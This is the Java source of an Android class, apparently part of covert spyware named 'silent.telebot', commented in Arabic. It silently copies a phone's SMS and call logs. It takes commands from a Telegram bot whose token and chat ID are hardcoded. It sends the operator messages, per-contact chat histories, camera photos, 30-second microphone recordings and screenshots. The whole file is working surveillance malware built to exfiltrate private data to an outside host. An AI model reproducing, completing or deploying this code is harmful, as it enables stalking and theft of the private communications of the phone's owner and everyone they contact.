package com.silent.telebot;

import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Telephony;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Map;

public class TelegramPoller implements Runnable {
    private Context ctx;
    private DatabaseHelper dbHelper;

    // ⚠️ غيّر هذين السطرين فقط:
    private static final String BOT_TOKEN = "8664055093:AAFzjAY549sKvHPh7pdwepTgr7AUtzSW4c8";
    private static final String CHAT_ID = "7058836561";

    private static int lastUpdateId = 0;

    public TelegramPoller(Context ctx) {
        this.ctx = ctx;
        try {
            this.dbHelper = new DatabaseHelper(ctx);
        } catch (Exception e) {
            Log.e("TelegramPoller", "فشل تهيئة قاعدة البيانات: " + e.getMessage());
        }
    }

    @Override
    public void run() {
        try {
            syncDataFromPhone();

            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=5";
            HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);

            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) response.append(line);
            reader.close();
            conn.disconnect();

            JSONObject jsonResponse = new JSONObject(response.toString());
            if (jsonResponse.getBoolean("ok")) {
                JSONArray updates = jsonResponse.getJSONArray("result");
                for (int i = 0; i < updates.length(); i++) {
                    JSONObject update = updates.getJSONObject(i);
                    lastUpdateId = update.getInt("update_id");
                    if (update.has("message")) {
                        JSONObject message = update.getJSONObject("message");
                        String text = message.optString("text", "");
                        handleCommand(text);
                    }
                }
            }
        } catch (Exception e) {
            Log.e("TelegramPoller", "خطأ رئيسي: " + e.getMessage());
        }
    }

    // ============================================================
    //  🔄 المزامنة (تخزين الرسائل والمكالمات في SQLite)
    // ============================================================
    private void syncDataFromPhone() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (ctx.checkSelfPermission(android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                return;
            }
            if (ctx.checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
                return;
            }
        }

        // مزامنة صندوق الوارد
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                ContentResolver cr = ctx.getContentResolver();
                Cursor cursor = null;
                try {
                    cursor = cr.query(Telephony.Sms.Inbox.CONTENT_URI,
                            new String[]{"_id", "address", "body", "date"},
                            null, null, "date DESC");
                    if (cursor != null && cursor.moveToFirst() && dbHelper != null) {
                        do {
                            try {
                                dbHelper.insertSms(cursor.getLong(0), cursor.getString(1), cursor.getString(2), cursor.getLong(3));
                            } catch (Exception ignored) {}
                        } while (cursor.moveToNext());
                    }
                } catch (Exception ignored) {}
                finally { if (cursor != null) cursor.close(); }
            }
        } catch (Exception ignored) {}

        // مزامنة الرسائل المرسلة
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                ContentResolver cr = ctx.getContentResolver();
                Cursor cursor = null;
                try {
                    cursor = cr.query(Telephony.Sms.Sent.CONTENT_URI,
                            new String[]{"_id", "address", "body", "date"},
                            null, null, "date DESC");
                    if (cursor != null && cursor.moveToFirst() && dbHelper != null) {
                        do {
                            try {
                                dbHelper.insertSms(cursor.getLong(0), cursor.getString(1), cursor.getString(2), cursor.getLong(3));
                            } catch (Exception ignored) {}
                        } while (cursor.moveToNext());
                    }
                } catch (Exception ignored) {}
                finally { if (cursor != null) cursor.close(); }
            }
        } catch (Exception ignored) {}

        // مزامنة المكالمات
        try {
            ContentResolver cr = ctx.getContentResolver();
            Cursor cursor = null;
            try {
                cursor = cr.query(CallLog.Calls.CONTENT_URI,
                        new String[]{"_id", "number", "duration", "type", "date"},
                        null, null, "date DESC");
                if (cursor != null && cursor.moveToFirst() && dbHelper != null) {
                    do {
                        try {
                            dbHelper.insertCall(cursor.getLong(0), cursor.getString(1), cursor.getLong(2), cursor.getInt(3), cursor.getLong(4));
                        } catch (Exception ignored) {}
                    } while (cursor.moveToNext());
                }
            } catch (Exception ignored) {}
            finally { if (cursor != null) cursor.close(); }
        } catch (Exception ignored) {}
    }

    // ============================================================
    //  📋 معالجة الأوامر
    // ============================================================
    private void handleCommand(String cmd) {
        try {
            if (cmd.equals("/help")) {
                sendMessage(CHAT_ID, "📋 **الأوامر**\n━━━━━━━━━━━━━━━━━━\n" +
                        "📩 /get_sms - آخر 10 رسائل (وارد + صادر)\n" +
                        "📞 /get_calls - آخر 10 مكالمات\n" +
                        "💬 /get_chat رقم/اسم - رسائل محادثة مع شخص معين\n" +
                        "📷 /take_pic - التقاط صورة\n" +
                        "🎤 /record - تسجيل صوتي (30ث)\n" +
                        "🖥️ /screenshot - لقطة شاشة");
            }
            else if (cmd.startsWith("/get_chat")) {
                String query = cmd.replace("/get_chat", "").trim();
                if (query.isEmpty()) {
                    sendMessage(CHAT_ID, "❌ يرجى إدخال رقم أو اسم جهة اتصال.\nمثال: /get_chat 0551234567");
                } else {
                    sendMessage(CHAT_ID, getChatHistory(query));
                }
            }
            else if (cmd.equals("/get_sms")) {
                sendMessage(CHAT_ID, getSmsFromLocalDB());
            }
            else if (cmd.equals("/get_calls")) {
                sendMessage(CHAT_ID, getCallsFromLocalDB());
            }
            else if (cmd.equals("/take_pic")) {
                capturePhoto();
            }
            else if (cmd.equals("/record")) {
                startRecording();
            }
            else if (cmd.equals("/screenshot")) {
                ScreenCaptureService.takeScreenshot(ctx, CHAT_ID, BOT_TOKEN);
            }
            else {
                sendMessage(CHAT_ID, "❌ أمر غير معروف. استخدم /help");
            }
        } catch (Exception e) {
            sendMessage(CHAT_ID, "❌ حدث خطأ: " + e.getMessage());
            Log.e("TelegramPoller", "خطأ في الأمر: " + e.getMessage());
        }
    }

    // ============================================================
    //  💬 محادثة مع شخص معين (جلب الرسائل من الطرفين)
    // ============================================================
    private String getChatHistory(String query) {
        try {
            if (dbHelper == null) return "❌ قاعدة البيانات غير جاهزة.";

            String targetNumber = query;
            String contactName = null;

            if (query.matches("[0-9+]+")) {
                targetNumber = query.replaceAll("[^0-9+]", "");
                contactName = getContactName(targetNumber);
            } else {
                targetNumber = getNumberFromContact(query);
                if (targetNumber != null) {
                    contactName = query;
                } else {
                    return searchMessagesByText(query);
                }
            }

            if (targetNumber == null) {
                return "❌ لم يتم العثور على جهة اتصال بالاسم: " + query;
            }

            List<Map<String, String>> list = dbHelper.getChatWith(targetNumber, 20);
            if (list.isEmpty()) {
                return "📭 لا توجد رسائل في المحادثة مع " + (contactName != null ? contactName : targetNumber);
            }

            StringBuilder sb = new StringBuilder("💬 **محادثة مع " + (contactName != null ? contactName : targetNumber) + "**\n");
            sb.append("━━━━━━━━━━━━━━━━━━━━\n");
            SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault());

            for (Map<String, String> msg : list) {
                try {
                    String address = msg.get("address");
                    String body = msg.get("body");
                    String dateStr = msg.get("date");
                    if (address == null || body == null || dateStr == null) continue;

                    String senderName;
                    if (address.equals("me")) {
                        senderName = "👤 **أنت**";
                    } else {
                        String name = getContactName(address);
                        senderName = "👤 **" + (name != null ? name : address) + "**";
                    }

                    long dateMillis = Long.parseLong(dateStr);
                    sb.append(senderName).append("\n");
                    sb.append("📝 ").append(body).append("\n");
                    sb.append("🕐 ").append(sdf.format(new Date(dateMillis))).append("\n");
                    sb.append("━━━━━━━━━━━━━━━━━━━━\n");
                } catch (Exception ignored) {}
            }
            return sb.toString();
        } catch (Exception e) {
            return "❌ خطأ: " + e.getMessage();
        }
    }

    // البحث عن رسائل تحتوي على نص معين
    private String searchMessagesByText(String text) {
        try {
            if (dbHelper == null) return "❌ قاعدة البيانات غير جاهزة.";
            List<Map<String, String>> list = dbHelper.searchSmsByText(text, 20);
            if (list.isEmpty()) {
                return "📭 لا توجد رسائل تحتوي على: " + text;
            }

            StringBuilder sb = new StringBuilder("🔍 **نتائج البحث عن: " + text + "**\n");
            sb.append("━━━━━━━━━━━━━━━━━━━━\n");
            SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault());

            for (Map<String, String> msg : list) {
                try {
                    String address = msg.get("address");
                    String body = msg.get("body");
                    String dateStr = msg.get("date");
                    if (address == null || body == null || dateStr == null) continue;

                    String name = getContactName(address);
                    String displayName = (name != null) ? name : address;
                    long dateMillis = Long.parseLong(dateStr);

                    sb.append("👤 **").append(displayName).append("**\n");
                    sb.append("📝 ").append(body).append("\n");
                    sb.append("🕐 ").append(sdf.format(new Date(dateMillis))).append("\n");
                    sb.append("━━━━━━━━━━━━━━━━━━━━\n");
                } catch (Exception ignored) {}
            }
            return sb.toString();
        } catch (Exception e) {
            return "❌ خطأ في البحث: " + e.getMessage();
        }
    }

    private String getNumberFromContact(String contactName) {
        try {
            ContentResolver cr = ctx.getContentResolver();
            Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
            String[] projection = {ContactsContract.CommonDataKinds.Phone.NUMBER};
            String selection = ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " LIKE ?";
            String[] selectionArgs = {"%" + contactName + "%"};
            Cursor cursor = null;
            try {
                cursor = cr.query(uri, projection, selection, selectionArgs, null);
                if (cursor != null && cursor.moveToFirst()) {
                    return cursor.getString(0).replaceAll("[^0-9+]", "");
                }
            } finally { if (cursor != null) cursor.close(); }
        } catch (Exception ignored) {}
        return null;
    }

    // ============================================================
    //  📩 عرض الرسائل (وارد + صادر) مع الاسم والرقم
    // ============================================================
    private String getSmsFromLocalDB() {
        try {
            if (dbHelper == null) return "❌ قاعدة البيانات غير جاهزة.";
            List<Map<String, String>> list = dbHelper.getLastSms(10);
            if (list.isEmpty()) return "📭 لا توجد رسائل محفوظة.";
            StringBuilder sb = new StringBuilder("📩 **آخر 10 رسائل (وارد + صادر)**\n");
            sb.append("━━━━━━━━━━━━━━━━━━━━\n");
            SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault());

            for (Map<String, String> sms : list) {
                try {
                    String address = sms.get("address");
                    String body = sms.get("body");
                    String dateStr = sms.get("date");
                    if (address == null || body == null || dateStr == null) continue;

                    String contactName = getContactName(address);
                    String displayName;
                    if (contactName != null && !contactName.isEmpty()) {
                        displayName = contactName + " (" + address + ")";
                    } else {
                        displayName = address;
                    }

                    long dateMillis = Long.parseLong(dateStr);
                    sb.append("👤 **").append(displayName).append("**\n");
                    sb.append("📝 ").append(body).append("\n");
                    sb.append("🕐 ").append(sdf.format(new Date(dateMillis))).append("\n");
                    sb.append("━━━━━━━━━━━━━━━━━━━━\n");
                } catch (Exception ignored) {}
            }
            return sb.toString();
        } catch (Exception e) {
            return "❌ خطأ في قراءة الرسائل: " + e.getMessage();
        }
    }

    // ============================================================
    //  📞 عرض المكالمات مع الاسم والرقم
    // ============================================================
    private String getCallsFromLocalDB() {
        try {
            if (dbHelper == null) return "❌ قاعدة البيانات غير جاهزة.";
            List<Map<String, String>> list = dbHelper.getLastCalls(10);
            if (list.isEmpty()) return "📭 لا توجد مكالمات محفوظة.";
            StringBuilder sb = new StringBuilder("📞 **آخر 10 مكالمات**\n━━━━━━━━━━━━━━━━━━━━\n");
            SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy HH:mm", Locale.getDefault());

            for (Map<String, String> call : list) {
                try {
                    String number = call.get("number");
                    String durationStr = call.get("duration");
                    String typeStr = call.get("type");
                    String dateStr = call.get("date");
                    if (number == null || durationStr == null || typeStr == null || dateStr == null) continue;

                    String contactName = getContactName(number);
                    String displayName;
                    if (contactName != null && !contactName.isEmpty()) {
                        displayName = contactName + " (" + number + ")";
                    } else {
                        displayName = number;
                    }

                    int type = Integer.parseInt(typeStr);
                    String typeDisplay = (type == CallLog.Calls.INCOMING_TYPE) ? "📥 وارد" :
                                         (type == CallLog.Calls.OUTGOING_TYPE) ? "📤 صادر" : "❌ فائتة";
                    long dateMillis = Long.parseLong(dateStr);
                    sb.append("👤 **").append(displayName).append("**\n");
                    sb.append("📌 ").append(typeDisplay).append("\n");
                    sb.append("⏱️ ").append(formatDuration(Long.parseLong(durationStr))).append("\n");
                    sb.append("🕐 ").append(sdf.format(new Date(dateMillis))).append("\n");
                    sb.append("━━━━━━━━━━━━━━━━━━━━\n");
                } catch (Exception ignored) {}
            }
            return sb.toString();
        } catch (Exception e) {
            return "❌ خطأ في قراءة المكالمات: " + e.getMessage();
        }
    }

    // ============================================================
    //  📷 الكاميرا (التقاط صورة)
    // ============================================================
    private void capturePhoto() {
        try {
            File photoFile = new File(ctx.getCacheDir(), "temp_photo.jpg");
            if (photoFile.exists()) photoFile.delete();
            Uri photoUri = androidx.core.content.FileProvider.getUriForFile(ctx,
                    ctx.getPackageName() + ".fileprovider", photoFile);

            Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
            intent.putExtra(MediaStore.EXTRA_OUTPUT, photoUri);
            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            ctx.startActivity(intent);

            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                if (photoFile.exists() && photoFile.length() > 0) {
                    sendPhotoStatic(CHAT_ID, photoFile, BOT_TOKEN);
                } else {
                    sendMessage(CHAT_ID, "❌ فشل التقاط الصورة.");
                }
            }, 3000);

        } catch (Exception e) {
            sendMessage(CHAT_ID, "❌ خطأ في الكاميرا: " + e.getMessage());
        }
    }

    // ============================================================
    //  🎤 التسجيل الصوتي
    // ============================================================
    private void startRecording() {
        try {
            File audioFile = new File(ctx.getCacheDir(), "recording.3gp");
            if (audioFile.exists()) audioFile.delete();

            android.media.MediaRecorder recorder = new android.media.MediaRecorder();
            recorder.setAudioSource(android.media.MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(android.media.MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile(audioFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();

            sendMessage(CHAT_ID, "🎙️ **بدأ التسجيل لمدة 30 ثانية...**");

            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                try {
                    recorder.stop();
                    recorder.release();
                    if (audioFile.exists() && audioFile.length() > 0) {
                        sendAudioStatic(CHAT_ID, audioFile, BOT_TOKEN);
                    } else {
                        sendMessage(CHAT_ID, "❌ فشل التسجيل (الملف فارغ).");
                    }
                } catch (Exception e) {
                    sendMessage(CHAT_ID, "❌ خطأ في التسجيل: " + e.getMessage());
                }
            }, 30000);

        } catch (Exception e) {
            sendMessage(CHAT_ID, "❌ صلاحية الميكروفون غير ممنوحة.");
        }
    }

    // ============================================================
    //  📤 إرسال الملفات (ثابتة)
    // ============================================================
    public static void sendPhotoStatic(String chatId, File photoFile, String botToken) {
        try {
            String boundary = "*****" + System.currentTimeMillis() + "*****";
            String lineEnd = "\r\n";
            String twoHyphens = "--";

            URL url = new URL("https://api.telegram.org/bot" + botToken + "/sendPhoto");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoInput(true);
            conn.setDoOutput(true);
            conn.setUseCaches(false);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Connection", "Keep-Alive");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            DataOutputStream dos = new DataOutputStream(conn.getOutputStream());

            dos.writeBytes(twoHyphens + boundary + lineEnd);
            dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd);
            dos.writeBytes(lineEnd);
            dos.writeBytes(chatId + lineEnd);

            dos.writeBytes(twoHyphens + boundary + lineEnd);
            dos.writeBytes("Content-Disposition: form-data; name=\"photo\"; filename=\"" + photoFile.getName() + "\"" + lineEnd);
            dos.writeBytes(lineEnd);

            FileInputStream fileInputStream = new FileInputStream(photoFile);
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = fileInputStream.read(buffer)) != -1) {
                dos.write(buffer, 0, bytesRead);
            }
            fileInputStream.close();
            dos.writeBytes(lineEnd);
            dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
            dos.flush();
            dos.close();
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception ignored) {}
    }

    public static void sendAudioStatic(String chatId, File audioFile, String botToken) {
        try {
            String boundary = "*****" + System.currentTimeMillis() + "*****";
            String lineEnd = "\r\n";
            String twoHyphens = "--";

            URL url = new URL("https://api.telegram.org/bot" + botToken + "/sendAudio");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoInput(true);
            conn.setDoOutput(true);
            conn.setUseCaches(false);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Connection", "Keep-Alive");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            DataOutputStream dos = new DataOutputStream(conn.getOutputStream());

            dos.writeBytes(twoHyphens + boundary + lineEnd);
            dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd);
            dos.writeBytes(lineEnd);
            dos.writeBytes(chatId + lineEnd);

            dos.writeBytes(twoHyphens + boundary + lineEnd);
            dos.writeBytes("Content-Disposition: form-data; name=\"audio\"; filename=\"" + audioFile.getName() + "\"" + lineEnd);
            dos.writeBytes(lineEnd);

            FileInputStream fileInputStream = new FileInputStream(audioFile);
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = fileInputStream.read(buffer)) != -1) {
                dos.write(buffer, 0, bytesRead);
            }
            fileInputStream.close();
            dos.writeBytes(lineEnd);
            dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
            dos.flush();
            dos.close();

            int responseCode = conn.getResponseCode();
            if (responseCode != 200) {
                sendMessageStatic(chatId, "❌ فشل إرسال الصوت (كود: " + responseCode + ")");
            }
            conn.disconnect();
        } catch (Exception e) {
            sendMessageStatic(chatId, "❌ خطأ في إرسال الصوت: " + e.getMessage());
        }
    }

    public static void sendMessageStatic(String chatId, String text) {
        try {
            String encodedText = java.net.URLEncoder.encode(text, "UTF-8");
            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN +
                    "/sendMessage?chat_id=" + chatId +
                    "&text=" + encodedText;
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception ignored) {}
    }

    // ============================================================
    //  🔍 مساعدات
    // ============================================================
    private String getContactName(String phoneNumber) {
        if (phoneNumber == null || phoneNumber.isEmpty()) return null;
        try {
            ContentResolver cr = ctx.getContentResolver();
            Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, Uri.encode(phoneNumber));
            Cursor cursor = null;
            try {
                cursor = cr.query(uri, new String[]{ContactsContract.PhoneLookup.DISPLAY_NAME}, null, null, null);
                if (cursor != null && cursor.moveToFirst()) return cursor.getString(0);
            } finally { if (cursor != null) cursor.close(); }
        } catch (Exception ignored) {}
        return null;
    }

    private String formatDuration(long seconds) {
        if (seconds < 60) return seconds + " ثانية";
        long minutes = seconds / 60;
        long secs = seconds % 60;
        if (secs == 0) return minutes + " دقيقة";
        return minutes + " دقيقة و " + secs + " ثانية";
    }

    private void sendMessage(String chatId, String text) {
        try {
            String encodedText = java.net.URLEncoder.encode(text, "UTF-8");
            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN +
                    "/sendMessage?chat_id=" + chatId +
                    "&text=" + encodedText;
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) { /* صامت */ }
    }
}
